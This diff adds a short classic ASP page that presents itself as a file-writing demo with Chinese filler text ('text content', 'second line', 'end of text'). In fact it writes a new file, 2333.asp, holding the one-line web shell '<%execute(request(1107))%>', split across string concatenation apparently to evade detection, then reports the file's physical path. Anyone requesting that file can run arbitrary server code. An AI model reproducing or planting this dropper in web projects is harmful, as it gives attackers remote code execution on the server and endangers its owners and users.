@@ -1,0 +1,22 @@
+<%
+dim filestr,strtmp
+dim filename,filepath
+filename="2333.asp"
+filestr="<" + "%execute(request(1107))%" + ">"
+filestr=filestr & "文本的中内容" & "<br>" & vbcrlf
+filestr=filestr & "文本的第二行" & "<br>" & vbcrlf
+filestr=filestr & "文本结束" & "<br>" & vbcrlf
+filepath=Server.MapPath(filename)
+set fileConn=Server.CreateObject("Scripting.FileSystemObject")
+set fileOpen=fileConn.OpenTextfile(filepath,2,true)
+fileOpen.write(filestr)
+fileOpen.close
+set fileConn=nothing
+set fileOpen=nothing
+Response.Write("文件名：")
+Response.Write(filename)
+Response.Write("<br>文件物理路径：")
+Response.Write(filepath)
+Response.Write("<br>文件的内容：<br><br>")
+Response.Write(filestr)
+%>
